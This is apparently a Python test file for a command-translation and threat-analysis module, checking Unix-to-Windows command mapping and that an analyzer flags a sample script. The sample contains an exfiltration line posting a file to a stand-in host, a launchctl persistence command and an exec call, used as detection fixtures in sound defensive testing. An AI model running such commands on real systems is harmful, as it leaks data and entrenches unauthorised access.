from core.adaptation.rosetta_stone import RosettaStone


def test_rosetta_integration_adapts_command_tokens_for_target_operating_system():
    rosetta = RosettaStone()

    assert rosetta.adapt_command("cp source.txt dest.txt", target_os="windows") == "copy source.txt dest.txt"
    assert rosetta.adapt_command("mv source.txt dest.txt", target_os="windows") == "move source.txt dest.txt"
    assert rosetta.adapt_command("ship logs", target_os="windows") == "ship logs"


def test_rosetta_integration_reports_multiple_threat_classes():
    rosetta = RosettaStone()

    report = rosetta.analyze_threat(
        "import requests\n"
        "requests.post('https://example.invalid/upload', data=open('payload.txt').read())\n"
        "launchctl load persist.plist\n"
        "exec('print(1)')\n"
    )

    assert report["safe"] is False
    assert "Networking / Exfiltration Attempt" in report["threats"]
    assert "Persistence Mechanism" in report["threats"]
    assert "Dynamic Execution / Obfuscation" in report["threats"]
